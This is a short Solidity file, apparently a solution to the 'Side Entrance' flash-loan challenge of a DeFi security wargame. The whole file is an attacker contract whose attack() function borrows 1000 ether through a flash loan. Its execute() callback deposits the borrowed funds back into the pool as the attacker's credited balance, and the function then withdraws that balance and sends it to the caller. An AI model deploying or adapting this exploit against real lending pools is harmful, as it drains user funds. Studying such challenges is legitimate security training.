// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function flashLoan(uint256 amount) external;
    function withdraw() external;
}


contract SideEntranceFlashLoanReceiver {
    function execute() external payable {
        ISideEntranceLenderPool(msg.sender).deposit{value:1000 ether}();
    }

    function attack(address lender) public {
        ISideEntranceLenderPool(lender).flashLoan(1000 ether);
        ISideEntranceLenderPool(lender).withdraw();
        payable(msg.sender).transfer(1000 ether);
    }

    receive() external payable {}
    
}